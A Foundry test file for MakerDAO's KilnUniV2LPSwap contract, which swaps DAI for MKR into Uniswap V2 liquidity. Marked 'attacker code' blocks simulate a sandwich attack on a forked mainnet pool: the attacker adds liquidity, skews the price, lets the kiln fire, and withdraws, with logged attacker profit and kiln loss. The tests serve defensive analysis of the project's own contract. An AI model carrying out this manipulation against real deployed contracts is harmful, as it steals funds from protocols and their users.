// SPDX-FileCopyrightText: © 2022 Dai Foundation <www.daifoundation.org>
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "./KilnUniV2LPSwap.sol";
import "./test/DsValue.sol";

interface TestGem {
    function totalSupply() external view returns (uint256);
}

interface UniswapV2RouterExtendedLike is UniswapRouterV2Like {
    function quote(uint256, uint256 ,uint256) external pure returns (uint256);
    function getAmountOut(uint256, uint256, uint256) external pure returns (uint256);
    function removeLiquidity(address, address, uint256, uint256, uint256, address, uint256) external returns (uint amountA, uint amountB);
}

interface UniswapV2FactoryLike {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

interface UniswapV2PairLike {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}



contract User {}

contract KilnTest is Test {
    KilnUniV2LPSwap kiln;
    User user;

    using UniswapV2Library for *;


    address constant DAI  = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant MKR  = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;

    uint256 constant WAD = 1e18;

    address constant ROUTER   = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    event File(bytes32 indexed what, bytes data);
    event File(bytes32 indexed what, uint256 data);

    function setUp() public {
        user = new User();

        kiln = new KilnUniV2LPSwap(DAI, MKR, ROUTER, address(user));

        kiln.file("lot", 50000 * WAD);
        kiln.file("hop", 6 hours);
    }

    function setPip(uint256 val) internal returns (address pip) {
        DSValue _pip = new DSValue();
        _pip.poke(bytes32(val));
        return address(_pip);
    }

    //rounds to zero if x*y < WAD / 2
    function _wdiv(uint x, uint y) internal pure returns (uint z) {
        z = (x * WAD + y / 2) / y;
    }

    // not provided in DSTest
    function assertEqApprox(uint256 _a, uint256 _b, uint256 _tolerance) internal {
        uint256 a = _a;
        uint256 b = _b;
        if (a < b) {
            uint256 tmp = a;
            a = b;
            b = tmp;
        }
        if (a - b > _tolerance) {
            emit log_bytes32("Error: Wrong `uint' value");
            emit log_named_uint("  Expected", _b);
            emit log_named_uint("    Actual", _a);
            fail();
        }
    }

    function topUpLiquidity(uint256 initialDaiLiquidity) internal {
        uint256 daiAmt = initialDaiLiquidity > 0 ? initialDaiLiquidity : 5_000_000 * WAD;
        uint256 mkrAmt = 5000 * WAD;

        uint reserveA;
        uint reserveB;
        (address token0,) = UniswapV2Library.sortTokens(DAI, MKR);
        (uint reserve0, uint reserve1,) = UniswapV2PairLike(kiln.pairToken()).getReserves();
        (reserveA, reserveB) = DAI == token0 ? (reserve0, reserve1) : (reserve1, reserve0);

        if (reserveA > reserveB) {
            mkrAmt = daiAmt / (reserveA / reserveB) - 10 * WAD;
        } else {
            daiAmt = mkrAmt / (reserveB / reserveA);
        }

        // assume initial funder in another address, attacker will be address(this)
        vm.startPrank(address(123));
        deal(DAI, address(123), daiAmt);
        deal(MKR, address(123), mkrAmt);

        GemLike(DAI).approve(ROUTER, daiAmt);
        GemLike(MKR).approve(ROUTER, mkrAmt);

        UniswapRouterV2Like(ROUTER).addLiquidity(
            MKR,
            DAI,
            mkrAmt,
            daiAmt,
            mkrAmt,
            1,
            address(123),
            block.timestamp);

        assertGt(GemLike(kiln.pairToken()).balanceOf(address(123)), 0);
        vm.stopPrank();
    }

    function mintDai(address usr, uint256 amt) internal returns (uint256) {
        deal(DAI, usr, amt);
        assertEq(GemLike(DAI).balanceOf(address(usr)), amt);
        return amt;
    }

    function mintMKR(address usr, uint256 amt) internal returns (uint256) {
        deal(MKR, usr, amt);
        assertEq(GemLike(MKR).balanceOf(address(usr)), amt);
        return amt;
    }

    function estimateLPTokenAmount(bool buyMkr, uint256 amount) internal returns (uint256 lpAmt) {

        mintDai(address(this), amount);
        uint256 half = amount / 2;
        address sell = (buyMkr) ? DAI : MKR;
        address buy = (buyMkr) ? MKR : DAI;

        address[] memory _path = new address[](2);
        _path[0] = sell;
        _path[1] = buy;

        GemLike(sell).approve(ROUTER, amount);

        uint256 swapped = trade(true, half);

        GemLike(buy).approve(ROUTER, swapped);

        GemLike(buy).approve(ROUTER, type(uint256).max);
        GemLike(sell).approve(ROUTER, type(uint256).max);

        (uint256 addAmountA, uint256 addAmountB, uint256 outLpAmt) = UniswapRouterV2Like(ROUTER).addLiquidity(
            sell,              // tokenA
            buy,               // tokenB
            half,              // amountADesired
            swapped,           // amountBDesired
            1,                 // amountAMin
            1,                 // amountBMin
            address(this),     // to
            block.timestamp);  // deadline

        // Reset pool
        GemLike(UniswapRouterV2Like(ROUTER).factory().pairFor(sell, buy)).approve(ROUTER, outLpAmt);
        (uint outAmountA, uint outAmountB) = UniswapRouterV2Like(ROUTER).removeLiquidity(sell, buy, outLpAmt, 0, 0, address(this), block.timestamp);
        trade(false, outAmountB);

        {
        // There is a small difference in the amount added vs. the amount received due to token price rounding in the router
        assertEqApprox(outAmountA, addAmountA, 1e10);
        assertEqApprox(outAmountB, addAmountB, 1e10);
        assertLe(outAmountA, addAmountA, "Amount A received gt amount sent");
        assertLe(outAmountB, addAmountB, "Amount B received gt amount sent");
        }

        lpAmt = outLpAmt;
    }

    function getLiquidityStatus(bool print) public view returns (uint256 reserveDai, uint256 reserveMkr, uint256 price) {
        (address token0,) = UniswapV2Library.sortTokens(DAI, MKR);
        (uint reserve0, uint reserve1,) = UniswapV2PairLike(kiln.pairToken()).getReserves();
        reserveDai = DAI == token0 ? reserve0 : reserve1;
        reserveMkr = DAI == token0 ? reserve1 : reserve0;

        price = reserveDai / reserveMkr;

        price = (price == 0) ? 1 : price;  // don't return 0 price

        if (print) console.log("liquidity status %s dai, %d mkr, price %s", reserveDai / WAD, reserveMkr / WAD, price);
    }

    function trade(bool buyMkr, uint256 amount) public returns (uint256 swapped) {
        address sell = buyMkr ? DAI : MKR;
        address buy = buyMkr ? MKR : DAI;

        GemLike(sell).approve(ROUTER, amount);

        address[] memory _path = new address[](2);
        _path[0] = sell;
        _path[1] = buy;

        uint256[] memory amounts = UniswapRouterV2Like(ROUTER).swapExactTokensForTokens(
            amount,           // amountIn
            0,                // amountOutMin
            _path,            // path
            address(this),    // to
            block.timestamp); // deadline

        swapped = amounts[amounts.length - 1];
    }

    // sum up all kiln funds - in the contract and in the reaceiver
    function getKilnTotal(address receiver) public view returns (uint256 kilnTotal) {
        uint256 kilnDai = GemLike(DAI).balanceOf(address(kiln));
        uint256 kilnMKRr = GemLike(MKR).balanceOf(address(kiln));

        (uint256 reserveDai, uint256 reserveMkr, uint256 fairPrice) = getLiquidityStatus(false);
        uint256 totalLp = GemLike(kiln.pairToken()).totalSupply();
        uint256 currentLp = GemLike(kiln.pairToken()).balanceOf(receiver);

        kilnTotal = kilnDai +
                    kilnMKRr * fairPrice +
                    currentLp * (reserveDai + reserveMkr * fairPrice) / totalLp;
    }

    function fireV2Single(uint256 initialDaiLiquidity, uint256 depositDai, uint256 skewDai) public {
        mintDai(address(kiln), 100_000 * WAD);
        topUpLiquidity(initialDaiLiquidity);

        assertEq(GemLike(kiln.pairToken()).balanceOf(address(user)), 0);

        kiln.file("lot", 20000 * WAD);

        ///////////////// attacker code ///////////////////////
        console.log("initialDaiLiquidity %s, attacker deposit %s dai, attacker skew %s dai", initialDaiLiquidity / WAD, depositDai / WAD, skewDai / WAD);

        // store kiln initial status, print pool state
        uint256 kilnInitialTotal = getKilnTotal(address(user));
        getLiquidityStatus(true);

        uint256 preAttackLPTokens = estimateLPTokenAmount(true, 20000 * WAD);

        // attacker initial funding
        (,,uint256 fairPrice) = getLiquidityStatus(false);
        uint256 depositMKR = depositDai / fairPrice;
        deal(DAI, address(this), (depositDai + skewDai) * 110 / 100);
        deal(MKR, address(this), depositMKR * 110 / 100);

        uint256 attackerInitialTotal = GemLike(DAI).balanceOf(address(this)) +
                                       GemLike(MKR).balanceOf(address(this)) * fairPrice;

        // attacker deposits to the pool at fair price to increase his share
        GemLike(DAI).approve(ROUTER, type(uint256).max);
        GemLike(MKR).approve(ROUTER, type(uint256).max);
        (,,uint256 attackerLp) = UniswapRouterV2Like(ROUTER).addLiquidity(MKR, DAI, depositMKR, depositDai, 0, 0, address(this), block.timestamp);

        // attacker skews price
        uint256 boughtMkr = trade(true, skewDai);
        getLiquidityStatus(true);

        ////////////////// end attacker code ///////////////////////

        uint256 duringAttackLPTokens = estimateLPTokenAmount(true, 20000 * WAD);
        kiln.fire();

        //////////////// attacker code ///////////////////////

        // attacker trades back to dai
        trade(false, boughtMkr);

        // attacker withdraws from the pool
        GemLike(kiln.pairToken()).approve(ROUTER, attackerLp);
        UniswapRouterV2Like(ROUTER).removeLiquidity(MKR, DAI, attackerLp, 0, 0, address(this), block.timestamp);
        getLiquidityStatus(true);

        // final profit and loss calculation
        uint256 attackerEndTotal = GemLike(DAI).balanceOf(address(this)) +
                                   GemLike(MKR).balanceOf(address(this)) * fairPrice;
        console.log("attacker profit:");
        console.logInt((int256(attackerEndTotal) - int256(attackerInitialTotal)) / int256(WAD));

        uint256 kilnEndTotal = getKilnTotal(address(user));
        console.log("kiln loss:");
        console.logInt((int256(kilnInitialTotal) - int256(kilnEndTotal)) / int256(WAD));

        uint256 postAttackLPTokens = estimateLPTokenAmount(true, 20000 * WAD);

        //////////////// end attacker code ///////////////////////

        assertGt(GemLike(kiln.pairToken()).balanceOf(address(user)), 0);

        console.log("lp tokens from fire before attack %s", preAttackLPTokens);
        console.log("lp tokens from fire during attack %s", duringAttackLPTokens);
        // Note: Amount of tokens after attack will be lower than prior to attack
        //       due to increased pool liquidity from trade fees
        console.log("lp tokens from fire after  attack %s", postAttackLPTokens);

    }

    // this was the initial setting of this test (5M liquidity each side)
    // block = 16592592, lot 20k, attacker profit 2, kiln loss 105
    function testFireV2Single5MInitialLiquidity() public {
        uint256 initialDaiLiquidity = 5_000_000 * WAD; // as originaly set in the test
        uint256 depositDai          = 60_000_000 * WAD; // this is needed also in MKR
        uint256 skewDai             = 200_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this was the initial setting of this test (5M liquidity each side)
    // block = 16592592, lot 20k, attacker profit 2, kiln loss 105
    function testFireV2Single5MInitialLiquidityMax() public {
        kiln.file("max", 800 * WAD);

        uint256 initialDaiLiquidity = 5_000_000 * WAD; // as originaly set in the test
        uint256 depositDai          = 60_000_000 * WAD; // this is needed also in MKR
        uint256 skewDai             = 200_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this was the initial setting of this test (5M liquidity each side)
    // block = 16592592, lot 20k, attacker profit 2, kiln loss 105
    function testFireV2Single5MInitialLiquidityMaxPip() public {
        kiln.file("pip", setPip(800 * WAD));

        uint256 initialDaiLiquidity = 5_000_000 * WAD; // as originaly set in the test
        uint256 depositDai          = 60_000_000 * WAD; // this is needed also in MKR
        uint256 skewDai             = 200_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this test shows that with a bit less initial liquidity attacker can be profitable and kiln can get rekt
    // block = 16592592, lot 20k, attacker profit 1887, kiln loss 19654
    function testFireV2Single3MInitialLiquidity() public {
        uint256 initialDaiLiquidity = 3_000_000 * WAD;
        uint256 depositDai = 5_000_000 * WAD; // this is needed also in MKR (reasonable)
        uint256 skewDai    = 500_000_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this test shows that with a bit less initial liquidity attacker can be profitable and kiln can get rekt
    // block = 16592592, lot 20k, attacker profit 1887, kiln loss 19654
    function testFireV2Single3MInitialLiquidityMax() public {
        kiln.file("max", 800 * WAD);

        uint256 initialDaiLiquidity = 3_000_000 * WAD;
        uint256 depositDai = 5_000_000 * WAD; // this is needed also in MKR (reasonable)
        uint256 skewDai    = 500_000_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this test shows that with a bit less initial liquidity attacker can be profitable and kiln can get rekt
    // block = 16592592, lot 20k, attacker profit 1887, kiln loss 19654
    function testFireV2Single3MInitialLiquidityMaxPip() public {
        kiln.file("pip", setPip(800 * WAD));

        uint256 initialDaiLiquidity = 3_000_000 * WAD;
        uint256 depositDai = 5_000_000 * WAD; // this is needed also in MKR (reasonable)
        uint256 skewDai    = 500_000_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this is a sanity check showing that when initial liquidity is almost 0, almost all kiln lost is attacker profit
    // block = 16592592, lot 20k, attacker profit 19693, kiln loss 19771
    function testFireV2Single20KInitialLiquidity() public {
        uint256 initialDaiLiquidity = 20_000 * WAD; // as originaly set in the test
        uint256 depositDai          = 5_000_000 * WAD; // this is needed also in MKR
        uint256 skewDai             = 500_000_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this is a sanity check showing that when initial liquidity is almost 0, almost all kiln lost is attacker profit
    // block = 16592592, lot 20k, attacker profit 19693, kiln loss 19771
    function testFireV2Single20KInitialLiquidityMax() public {
        kiln.file("max", 800 * WAD);

        uint256 initialDaiLiquidity = 20_000 * WAD; // as originaly set in the test
        uint256 depositDai          = 5_000_000 * WAD; // this is needed also in MKR
        uint256 skewDai             = 500_000_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this is a sanity check showing that when initial liquidity is almost 0, almost all kiln lost is attacker profit
    // block = 16592592, lot 20k, attacker profit 19693, kiln loss 19771
    function testFireV2Single20KInitialLiquidityMaxPip() public {
        kiln.file("pip", setPip(800 * WAD));

        uint256 initialDaiLiquidity = 20_000 * WAD; // as originaly set in the test
        uint256 depositDai          = 5_000_000 * WAD; // this is needed also in MKR
        uint256 skewDai             = 500_000_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this was the initial setting of this test (5M liquidity each side)
    // block = 16592592, lot 20k
    function testFireV2Single5MInitialLiquidityInverse() public {

        // Offset pool in our favor
        mintMKR(address(this), 20000 * WAD);
        trade(false, 20000 * WAD);

        uint256 initialDaiLiquidity = 5_000_000 * WAD; // as originaly set in the test
        uint256 depositDai          = 60_000_000 * WAD; // this is needed also in MKR
        uint256 skewDai             = 200_000 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    // this was the initial setting of this test (5M liquidity each side)
    // block = 16592592, lot 20k
    function testFireV2Single5MInitialLiquidityInverseNoSkew() public {

        // Offset pool in our favor
        mintMKR(address(this), 20000 * WAD);
        trade(false, 20000 * WAD);

        uint256 initialDaiLiquidity = 5_000_000 * WAD; // as originaly set in the test
        uint256 depositDai          = 60_000_000 * WAD; // this is needed also in MKR
        uint256 skewDai             = 1 * WAD;

        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
    }

    function testFireV2Multi() public {
        mintDai(address(kiln), 100_000 * WAD);
        topUpLiquidity(0);

        assertEq(GemLike(kiln.pairToken()).balanceOf(address(user)), 0);

        kiln.file("lot", 20000 * WAD);

        kiln.fire();

        skip(6 hours);

        kiln.fire();

        assertGt(GemLike(kiln.pairToken()).balanceOf(address(user)), 0);
    }

    // TODO: test frontrun
    // TODO: test and account for 3rd party sending MKR to kiln
}
